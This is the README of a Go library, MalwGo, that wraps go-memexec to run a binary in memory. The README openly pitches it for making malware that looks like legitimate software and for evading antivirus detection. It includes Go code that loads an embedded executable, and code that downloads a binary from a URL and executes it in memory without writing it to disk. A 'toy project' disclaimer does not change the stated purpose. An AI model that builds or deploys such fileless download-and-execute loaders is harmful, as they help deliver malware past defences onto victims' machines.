# MalwGo (Malware + Go)

Notice: This project is a toy project built on top of [go-memexec](github.com/amenzhinsky/go-memexec) and is not intended to be used for malicious purposes.

Create a wrapper around any binary file to run it in memory. This can be useful to create for example a malware that runs like a legit software, and also to avoid antivirus detection (since the binary is not saved in the disk & can be downloaded from internet).

### Load a programm in memory from a embeded file

```go
package main

import (
    "fmt"
    "github.com/PiterWeb/malwgo"
    _ "embed"
)

//go:embed mybinary.exe
var MyBinary []byte

func main() {

    malgwo_inst, err := malwgo.New(&malwgo.Options{
        bin: MyBinary,
        onStart: func() {
            fmt.Println("Starting...")
        },
        onStop: func() {
            fmt.Println("Stopping...")
        },
        onBackground: func() {
            fmt.Println("Running in background...")
        },
    })

    if err != nil {
        panic(err)
    }

    malgwo_inst.Exec(nil)

    defer malgwo_inst.Close()

}
```

### Load a programm in memory from internet

```go
package main

import (
    "fmt"
    "github.com/PiterWeb/malwgo"
)

func main() {

    malgwo_inst, err := malwgo.New(&malwgo.Options{
        binUrl: "https://example.com/mybinary.exe",
        onStart: func() {
            fmt.Println("Starting...")
        },
        onStop: func() {
            fmt.Println("Stopping...")
        },
        onBackground: func() {
            fmt.Println("Running in background...")
        },
    })

    if err != nil {
        panic(err)
    }

    malgwo_inst.Exec(nil)

    defer malgwo_inst.Close()

}
```

### Thank you [amenzhinsky](github.com/amenzhinsky) for the [go-memexec](github.com/amenzhinsky/go-memexec) library

It is a very interesting library that allows to run a binary in memory. This project is a wrapper around it.